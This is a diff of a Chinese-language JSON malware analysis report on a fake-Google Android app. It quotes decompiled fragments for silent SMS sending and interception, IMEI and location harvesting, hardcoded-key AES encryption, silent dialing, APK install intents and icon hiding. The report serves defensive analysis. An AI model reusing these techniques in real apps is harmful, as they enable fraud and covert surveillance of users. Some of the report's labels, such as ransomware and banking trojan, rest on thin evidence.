@@ -6,7 +6,7 @@
     "应用名": "android.security.component",
     "是否恶意": true,
     "风险等级": "高",
-    "分析耗时(秒)": 493.4
+    "分析耗时(秒)": 1416.1
   },
   "行为列表": [
     {
@@ -53,18 +53,7 @@
           "risk_level": "高",
           "malicious_code_snippet": "SmsManager sms = SmsManager.getDefault();\nmessageBody = URLDecoder.decode(message, SystemConstant.DEFAULT_CHARSET);\nList<String> texts = sms.divideMessage(messageBody);\nfor (String text : texts) {\n    sms.sendTextMessage(address, null, text, sentIntent, deliveryIntent);\n}",
           "malicious_code_snippet_context": "      private static final String TAG = \"smsUtils\";\n  \n      public static void sendSms(String address, String message, PendingIntent sentIntent, PendingIntent deliveryIntent) {\n>>>         SmsManager sms = SmsManager.getDefault();\n>>>         String messageBody = null;\n>>>         try {\n>>>             messageBody = URLDecoder.decode(message, SystemConstant.DEFAULT_CHARSET);\n>>>         } catch (UnsupportedEncodingException e) {\n>>>             e.printStackTrace();\n          }\n          List<String> texts = sms.divideMessage(messageBody);\n          for (String text : texts) {",
-          "behavior_description": "该方法通过 SmsManager.getDefault() 获取短信管理器实例，将传入的 message 参数进行 URLDecoder 解码（可能用于绕过检测的编码混淆），然后使用 divideMessage 拆分长短信，最后在 for 循环中调用 sms.sendTextMessage() 静默发送短信到指定地址。整个过程无需用户交互或确认，且类路径伪装为 com.google.android 包名以规避怀疑。数据流向：方法参数 address/message（来源，可能由 C2 服务器或硬编码配置指定）→ SmsManager.sendTextMessage()（危险操作，静默发送短信）。在恶意样本中，此行为通常用于向付费号码发送短信实施扣费欺诈，或向 C2 控制端发送窃取的用户隐私数据。",
-          "glm_analyzed": true
-        },
-        {
-          "class_path": "Lcom\\google\\android\\v54\\receive\\IncomeCallAndSmsReceiver;",
-          "method_signature": "if(keys == null)",
-          "malicious_behavior": "sms_fraud",
-          "behavior_type": "malicious",
-          "risk_level": "高",
-          "malicious_code_snippet": "if (number3.startsWith(interceptInfo.getPhone())) {\n    if (keys == null) {\n        abortBroadcast();\n    }\n}",
-          "malicious_code_snippet_context": "                          if (interceptInfo.getKey() != null) {\n                              keys = interceptInfo.getKey().split(\"\\\\|\");\n                          }\n>>>                         if (number3.startsWith(interceptInfo.getPhone())) {\n>>>                             boolean isIntercepted = false;\n>>>                             if (keys == null) {\n>>>                                 abortBroadcast();\n>>>                                 LogUtils.info(\"IncomeCallAndSmsReceiver\", \"delete sms call: \" + number3);\n                                  isIntercepted = true;\n                              } else {\n                                  String[] arr$ = keys;",
-          "behavior_description": "代码在广播接收器中根据预设的拦截规则匹配特定号码，当匹配成功且无特定关键字时，调用 abortBroadcast() 终止短信广播，从而在用户不知情的情况下拦截并隐藏短信。这通常用于隐藏验证码或银行通知，以配合后续的欺诈行为。",
+          "behavior_description": "该代码通过 SmsManager.sendTextMessage() 静默发送短信，全程无用户交互和系统UI提示。短信内容 message 先经过 URLDecoder.decode 解码（表明内容来自网络传输的编码数据，通常为远程C2服务器下发的指令或短信正文），再经 divideMessage 长信拆分后循环发送到指定号码 address。类路径伪装成 com.google.android 包名（v54 为伪装特征），结合日志 'send plugins' 表明这是插件化恶意框架的短信发送模块，典型用于短信欺诈（订阅扣费短信/发送诈骗短信）或向C2回传数据，可直接造成用户话费损失。",
           "glm_analyzed": true
         }
       ]
@@ -94,9 +83,39 @@
           "malicious_behavior": "device_fingerprinting",
           "behavior_type": "grayware",
           "risk_level": "中",
-          "malicious_code_snippet": "String deviceId = c(context, z[65]) ? ((TelephonyManager) context.getSystemService(z[66])).getDeviceId() : \"\";\nif (c(deviceId)) { return deviceId; }\nString string = Settings.Secure.getString(context.getContentResolver(), z[68]);\nif (!s.a(string) && c(deviceId) && !z[67].equals(string.toLowerCase(Locale.getDefault()))) { return string; }\nString n = n(context);\nif (!s.a(n) && c(n)) { return n; }",
-          "malicious_code_snippet_context": "  \n      private static String o(Context context) {\n          try {\n>>>             String deviceId = c(context, z[65]) ? ((TelephonyManager) context.getSystemService(z[66])).getDeviceId() : \"\";\n>>>             if (c(deviceId)) {\n>>>                 return deviceId;\n>>>             }\n>>>             String string = Settings.Secure.getString(context.getContentResolver(), z[68]);\n>>>             if (!s.a(string) && c(deviceId) && !z[67].equals(string.toLowerCase(Locale.getDefault()))) {\n                  return string;\n              }\n              String n = n(context);",
-          "behavior_description": "该方法通过多种途径采集设备唯一标识符：首先调用 TelephonyManager.getDeviceId() 获取 IMEI/MEID；若失败则通过 Settings.Secure.getString() 获取 Android ID；若仍失败则调用 n(context) 获取其他标识符（如设备序列号）。代码位于极光推送(JPush)SDK中，属于SDK标准功能，但在恶意样本背景下构成过度收集设备隐私信息的行为，采集的设备指纹可用于用户追踪和去匿名化。",
+          "malicious_code_snippet": "String deviceId = c(context, z[65]) ? ((TelephonyManager) context.getSystemService(z[66])).getDeviceId() : \"\";\nif (c(deviceId)) { return deviceId; }\nString string = Settings.Secure.getString(context.getContentResolver(), z[68]);\nif (!s.a(string) && c(deviceId) && !z[67].equals(string.toLowerCase(Locale.getDefault()))) { return string; }\nString strN = n(context);\nif (!s.a(strN) && c(strN)) { return strN; }",
+          "malicious_code_snippet_context": "  \n      private static String o(Context context) throws Throwable {\n          try {\n>>>             String deviceId = c(context, z[65]) ? ((TelephonyManager) context.getSystemService(z[66])).getDeviceId() : \"\";\n>>>             if (c(deviceId)) {\n>>>                 return deviceId;\n>>>             }\n>>>             String string = Settings.Secure.getString(context.getContentResolver(), z[68]);\n>>>             if (!s.a(string) && c(deviceId) && !z[67].equals(string.toLowerCase(Locale.getDefault()))) {\n                  return string;\n              }\n              String strN = n(context);",
+          "behavior_description": "该代码位于JPush推送SDK（字符串经z[]数组混淆）中，采用多级回退策略采集设备唯一标识：优先调用TelephonyManager.getDeviceId()获取IMEI；失败后读取Settings.Secure中的ANDROID_ID；再回退到其他标识生成方式（如MAC地址+Build.MODEL拼接哈希）。数据流向为：getDeviceId()/ANDROID_ID（source）→ 拼接/哈希后作为设备指纹返回给调用方（sink），用于设备唯一标识与注册，后续可能被上传至远程服务器实现用户追踪。在已确认恶意的样本中，此类未经明确授权的IMEI/ANDROID_ID采集属于过度的设备指纹收集行为，但代码本身未直接外传数据，需结合调用方判断。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "location_tracking",
+      "中文名": "位置追踪",
+      "MITRE": "T1430",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.ACCESS_FINE_LOCATION",
+          "android.permission.ACCESS_COARSE_LOCATION"
+        ],
+        "字符串": [
+          "getLastKnownLocation",
+          "requestLocationUpdates"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcn\\jpush\\android\\b\\g;",
+          "method_signature": "b()",
+          "malicious_behavior": "location_tracking",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "Criteria criteria = new Criteria();\ncriteria.setAccuracy(1);\nString bestProvider = this.e.getBestProvider(criteria, true);\nthis.f = this.e.getLastKnownLocation(bestProvider);\nif (this.f != null) {\n    a(this.f);\n}\nthis.e.requestLocationUpdates(bestProvider, 2000L, 10.0f, this.i);",
+          "malicious_code_snippet_context": "      }\n  \n      public final void b() {\n>>>         Criteria criteria = new Criteria();\n>>>         criteria.setAccuracy(1);\n>>>         criteria.setAltitudeRequired(false);\n>>>         criteria.setBearingRequired(false);\n>>>         criteria.setCostAllowed(true);\n>>>         criteria.setPowerRequirement(1);\n>>>         String bestProvider = this.e.getBestProvider(criteria, true);\n>>>         this.f = this.e.getLastKnownLocation(bestProvider);\n          if (this.f != null) {\n              a(this.f);\n          }",
+          "behavior_description": "该代码位于极光推送(JPush)SDK的位置采集模块。方法b()构造高精度(Criteria.ACCURACY_FINE)、允许计费的定位标准，通过LocationManager.getBestProvider()选取最佳定位源，先调用getLastKnownLocation()立即获取上次已知位置并交给内部方法a()处理，随后以2000毫秒/10米的最小间隔调用requestLocationUpdates()注册位置监听器this.i，实现对设备地理位置的高频持续追踪；方法c()负责注销监听。数据流向：系统位置服务→getLastKnownLocation()/requestLocationUpdates()→a(this.f)及监听器回调→SDK内部处理并上报远程服务器。作为知名推送SDK的标准位置采集功能，属于隐蔽的过度隐私收集行为，在恶意样本中会加剧用户位置隐私泄露风险。",
           "glm_analyzed": true
         }
       ]
@@ -130,9 +149,9 @@
           "malicious_behavior": "ransomware",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "private static final String aaaa = \"duew&^%5d54nc'KH\";\nSecretKeySpec skeySpec = new SecretKeySpec(aaaa.getBytes(), \"AES\");\nCipher cipher = Cipher.getInstance(\"AES\");\ncipher.init(1, skeySpec);\nbyte[] bytOut = cipher.doFinal(bytIn);\nString hex = byte2hexString(bytOut);",
-          "malicious_code_snippet_context": "  \n  /* loaded from: classes.dex */\n  public class EncryptUtils {\n>>>     private static final String aaaa = \"duew&^%5d54nc'KH\";\n>>> \n>>>     public static String encode(String in) {\n>>>         try {\n>>>             byte[] bytIn = in.getBytes();\n>>>             SecretKeySpec skeySpec = new SecretKeySpec(aaaa.getBytes(), \"AES\");\n              Cipher cipher = Cipher.getInstance(\"AES\");\n              cipher.init(1, skeySpec);\n              byte[] bytOut = cipher.doFinal(bytIn);",
-          "behavior_description": "使用硬编码的AES密钥对输入数据（通常为用户文件内容）进行AES加密，加密后的密文转换为十六进制字符串返回。该类同时包含decode解密方法，表明攻击者保留了密钥用于解密。这是典型的勒索软件文件加密行为，通过加密用户文件使其无法访问，进而勒索赎金。",
+          "malicious_code_snippet": "private static final String aaaa = \"duew&^%5d54nc'KH\";\nSecretKeySpec skeySpec = new SecretKeySpec(aaaa.getBytes(), \"AES\");\nCipher cipher = Cipher.getInstance(\"AES\");\ncipher.init(1, skeySpec);\nbyte[] bytOut = cipher.doFinal(bytIn);\nString hex = byte2hexString(bytOut);\nreturn hex;",
+          "malicious_code_snippet_context": "  \n  /* JADX INFO: loaded from: classes.dex */\n  public class EncryptUtils {\n>>>     private static final String aaaa = \"duew&^%5d54nc'KH\";\n>>> \n>>>     public static String encode(String in) {\n>>>         try {\n>>>             byte[] bytIn = in.getBytes();\n>>>             SecretKeySpec skeySpec = new SecretKeySpec(aaaa.getBytes(), \"AES\");\n>>>             Cipher cipher = Cipher.getInstance(\"AES\");\n              cipher.init(1, skeySpec);\n              byte[] bytOut = cipher.doFinal(bytIn);\n              String hex = byte2hexString(bytOut);",
+          "behavior_description": "该代码使用硬编码的AES密钥\"duew&^%5d54nc'KH\"对输入数据进行AES加密（未指定模式，默认ECB），并将密文转为十六进制字符串返回。类路径伪装为com.google.android.v54（假冒Google命名空间以规避怀疑），且配套存在decode解密方法，符合勒索软件对用户文件进行加密的典型实现。数据流向：读取的文件内容/目标数据→使用硬编码密钥的Cipher.doFinal() AES加密→输出十六进制密文，导致用户文件被加密后无法访问，造成直接数据损失。",
           "glm_analyzed": true
         }
       ]
@@ -163,9 +182,44 @@
           "malicious_behavior": "banking_trojan",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "package com.google.android.v54.activity;\nimport android.app.AlertDialog;\nimport android.app.ProgressDialog;\nimport android.os.PowerManager;\nimport com.google.android.v54.service.CallService;\nimport com.google.android.v54.service.ConnectionService;\nimport com.google.android.v54.service.RegisterBroadcastService;\nimport com.google.android.v54.service.RegisterService;",
-          "malicious_code_snippet_context": ">>> package com.google.android.v54.activity;\n>>> \n>>> import android.app.Activity;\n>>> import android.app.AlertDialog;\n>>> import android.app.ProgressDialog;\n>>> import android.content.DialogInterface;\n>>> import android.content.Intent;\n>>> import android.os.Bundle;\n  import android.os.Handler;\n  import android.os.Message;\n  import android.os.PowerManager;",
-          "behavior_description": "该Activity位于伪装为Google官方包名(com.google.android.v54)的恶意APK中，类名HeheActivity具有随意性命名特征。代码导入了AlertDialog和ProgressDialog用于构造钓鱼UI界面（如伪造银行登录弹窗诱导用户输入凭证），导入PowerManager用于保持设备唤醒以确保钓鱼界面持续展示，同时导入ConnectionService、CallService、RegisterService等后台服务用于将用户输入的凭证数据外传至C2服务器。整体构成凭证钓鱼攻击链：用户输入凭证(source)→通过ConnectionService网络外传(sink)。",
+          "malicious_code_snippet": "package com.google.android.v54.activity;\nimport android.app.AlertDialog;\nimport android.app.ProgressDialog;\nimport android.os.Handler;\nimport android.os.Message;\nimport android.os.PowerManager;\nimport com.google.android.v54.service.CallService;\nimport com.google.android.v54.service.ConnectionService;\nimport com.google.android.v54.service.RegisterBroadcastService;\nimport com.google.android.v54.service.RegisterService;",
+          "malicious_code_snippet_context": ">>> package com.google.android.v54.activity;\n>>> \n>>> import android.app.Activity;\n>>> import android.app.AlertDialog;\n>>> import android.app.ProgressDialog;\n>>> import android.content.DialogInterface;\n>>> import android.content.Intent;\n>>> import android.os.Bundle;\n>>> import android.os.Handler;\n>>> import android.os.Message;\n  import android.os.PowerManager;\n  import com.google.android.v54.R;\n  import com.google.android.v54.service.CallService;",
+          "behavior_description": "该类是已知银行木马家族（com.google.android.v54，HeheActivity）的凭证钓鱼界面Activity。其依赖组件构成完整钓鱼链路：ConnectionService/RegisterService 负责与C2服务器通信并接收下发指令，Handler/Message 异步处理指令后触发 HeheActivity 弹出 AlertDialog/ProgressDialog 伪造的银行登录/凭证输入界面诱导用户输入账号密码；PowerManager 用于获取 WakeLock 在钓鱼期间保持屏幕常亮，防止用户锁屏中断输入；CallService/RegisterBroadcastService 配合拦截短信验证码与来电。数据流向：C2下发钓鱼指令(source)→AlertDialog伪造凭证弹窗展示→用户输入的账号密码及拦截的短信验证码经ConnectionService回传C2(sink)，直接造成用户银行凭证泄露与财产损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.INSTALL_PACKAGES"
+            ],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\google\\android\\v54\\service\\BusinessService;",
+          "method_signature": "if(!apkfile.exists()",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "File apkfile = new File(Environment.getExternalStorageDirectory(), this.UPDATE_SAVE_NAME);\nif (!apkfile.exists()) { return; }\nIntent i = new Intent(\"android.intent.action.VIEW\");\ni.addFlags(268435456);\ni.setDataAndType(Uri.parse(\"file://\" + apkfile.toString()), \"application/vnd.android.package-archive\");\nthis.context.startActivity(i);",
+          "malicious_code_snippet_context": "              return;\n          }\n          LogUtils.debug(\"businessService\", \"NormalInstall\");\n>>>         File apkfile = new File(Environment.getExternalStorageDirectory(), this.UPDATE_SAVE_NAME);\n>>>         if (!apkfile.exists()) {\n>>>             LogUtils.debug(\"businessService\", \"APKNotExists!!!\");\n>>>             return;\n>>>         }\n>>>         Intent i = new Intent(\"android.intent.action.VIEW\");\n          i.addFlags(268435456);\n          i.setDataAndType(Uri.parse(\"file://\" + apkfile.toString()), \"application/vnd.android.package-archive\");\n          this.context.startActivity(i);",
+          "behavior_description": "该代码检查外部存储中指定文件名的更新APK（UPDATE_SAVE_NAME，通常由恶意服务端预先静默下载到本地），若存在则通过 ACTION_VIEW Intent 携带 application/vnd.android.package-archive MIME 类型并附加 FLAG_ACTIVITY_NEW_TASK，调起系统包安装器安装该APK。数据流向：外部存储中的APK文件（来源为远程C2服务器下载的更新包）→ startActivity 调起系统安装器（sink）。日志显示此为 NormalInstall 路径（暗示代码中可能还存在其他静默安装分支），该路径虽会弹出系统安装确认界面、并非完全静默，但在已确认的恶意样本上下文中，这是恶意软件自我更新/分发附加恶意载荷的典型机制，用户一旦点击确认即会植入新的恶意组件。",
           "glm_analyzed": true
         }
       ]
@@ -200,7 +254,38 @@
           "risk_level": "高",
           "malicious_code_snippet": "Intent intentCall = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + num));\nintentCall.addFlags(268435456);\nstartActivity(intentCall);",
           "malicious_code_snippet_context": "      }\n  \n      private void callPhone(String num, String time2) {\n>>>         Intent intentCall = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + num));\n>>>         intentCall.addFlags(268435456);\n>>>         startActivity(intentCall);\n          this.task = new TimerTask() { // from class: com.google.android.v54.service.CallService.2\n              @Override // java.util.TimerTask, java.lang.Runnable\n              public void run() {",
-          "behavior_description": "代码在后台服务中通过ACTION_CALL意图直接拨打电话，无需用户确认。参数num可能来自远程服务器配置，恶意软件常利用此行为拨打高费率号码进行吸费扣费，直接造成用户经济损失。",
+          "behavior_description": "该代码使用 ACTION_CALL Intent 直接静默拨打电话（区别于仅调起拨号界面供用户确认的 ACTION_DIAL），无需用户交互即可呼叫指定号码。数据流向为：方法参数 num（疑似来自远程C2指令或恶意配置）→ 拼接为 tel: URI → 通过 startActivity 发起实际呼叫。拨号后通过 TimerTask 定时向 Handler 发送消息执行后续操作（如自动挂断）。配合 isLockOn() 检测锁屏状态（KeyguardManager），恶意软件倾向于在用户锁屏无感知时拨打高额费率号码实施话费欺诈，或拨打攻击者号码窃听环境音。该类伪装在 com.google.android.v54 包名下以规避用户怀疑，属于典型的话费欺诈/静默拨号恶意行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "file_access",
+      "中文名": "文件访问/窃取",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_EXTERNAL_STORAGE",
+          "android.permission.WRITE_EXTERNAL_STORAGE"
+        ],
+        "字符串": [
+          "listFiles",
+          "FileOutputStream",
+          "getExternalStorageDirectory"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcn\\jpush\\android\\b;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "file_access",
+          "behavior_type": "grayware",
+          "risk_level": "低",
+          "malicious_code_snippet": "java.io.File r2 = android.os.Environment.getExternalStorageDirectory()\njava.lang.String r2 = r2.getAbsolutePath()\nStringBuilder r0 = r0.append(r2).append(java.io.File.separator)\njava.lang.String r2 = \"_\\u0001\\u001bY\\u0004\\u0019\"\nchar[] r2 = r2.toCharArray()",
+          "malicious_code_snippet_context": "              r1 = 0\n              java.lang.StringBuilder r0 = new java.lang.StringBuilder\n              r0.<init>()\n>>>             java.io.File r2 = android.os.Environment.getExternalStorageDirectory()\n>>>             java.lang.String r2 = r2.getAbsolutePath()\n>>>             java.lang.StringBuilder r0 = r0.append(r2)\n>>>             java.lang.String r2 = java.io.File.separator\n>>>             java.lang.StringBuilder r3 = r0.append(r2)\n              java.lang.String r2 = \"_\\u0001\\u001bY\\u0004\\u0019\"\n              r0 = -1\n          L1d:",
+          "behavior_description": "该代码位于伪装成极光推送(cn.jpush.android)的类中，在静态初始化块内通过 StringBuilder 拼接外部存储根目录路径(Environment.getExternalStorageDirectory().getAbsolutePath())与文件分隔符，再附加一个经字符数组混淆/解密的可疑文件名(\"_\\u0001\\u001bY\\u0004\\u0019\" 转为 char[] 后进行解密运算)，构造出 SD 卡上的隐蔽文件完整路径。数据流向为：外部存储根目录 → 拼接混淆解密后的隐藏文件名 → 生成 File 路径用于后续隐蔽读写。文件名使用字符级混淆属于反分析手段，正常 SDK 不会对简单文件名做此类加密，结合已确认恶意样本背景，该行为属于恶意样本在外部存储上建立/访问隐藏文件（常见于暂存窃取数据、存放 C2 配置或 payload），但本片段仅完成路径构造，实际危害需后续文件读写配合，故风险为中等。",
           "glm_analyzed": true
         }
       ]
@@ -224,9 +309,9 @@
           "malicious_behavior": "icon_hiding",
           "behavior_type": "malicious",
           "risk_level": "中",
-          "malicious_code_snippet": "ComponentName localComponentName = new ComponentName(this, HeheActivity.class);\ngetPackageManager().setComponentEnabledSetting(localComponentName, 2, 1);",
+          "malicious_code_snippet": "ComponentName localComponentName = new ComponentName(this, (Class<?>) HeheActivity.class);\ngetPackageManager().setComponentEnabledSetting(localComponentName, 2, 1);",
           "malicious_code_snippet_context": "      @Override // android.app.Service\n      public void onCreate() {\n          super.onCreate();\n>>>         ComponentName localComponentName = new ComponentName(this, (Class<?>) HeheActivity.class);\n>>>         getPackageManager().setComponentEnabledSetting(localComponentName, 2, 1);\n          this.mPrefs = getSharedPreferences(TAG, 0);\n          this.mConnMan = (ConnectivityManager) getSystemService(\"connectivity\");\n          checkNetwork();",
-          "behavior_description": "在 Service 的 onCreate() 中，通过 setComponentEnabledSetting() 将 HeheActivity 组件设置为 DISABLED 状态（参数值为2），使应用图标从启动器中隐藏，用户无法在桌面看到应用入口。这是恶意软件常用的隐蔽手段，安装后隐藏图标以避免用户察觉和卸载，同时后台 Service 继续运行执行恶意行为。",
+          "behavior_description": "在 RegisterService.onCreate() 中，代码构造指向应用入口 Activity（HeheActivity，即 launcher 组件）的 ComponentName，随后调用 PackageManager.setComponentEnabledSetting() 将其状态设为 2（COMPONENT_ENABLED_STATE_DISABLED，禁用组件），flag 为 1（DONT_KILL_APP，不杀死进程）。禁用 launcher 入口组件后，应用图标会从桌面和应用程序列表中消失，用户无法察觉该应用的存在也难以卸载，而恶意 Service 仍在后台存活并继续执行 checkNetwork()、sendRegisterRequest() 等网络注册/上线行为。数据流向：硬编码的 HeheActivity 组件名 → setComponentEnabledSetting() 禁用入口组件 → 实现图标隐藏与隐蔽驻留，属于典型的恶意软件逃避检测/持久化手法。",
           "glm_analyzed": true
         }
       ]
@@ -239,7 +324,7 @@
     "JADX反编译": "完整",
     "LLM语义分析": "已执行",
     "LLM交叉验证": "已执行",
-    "验证模型": "qwen3.7-plus",
+    "验证模型": "qwen3.8",
     "局限性": [
       "C2服务器.是否活跃: 需动态分析",
       "C2服务器.轮询间隔(秒): 需动态分析"
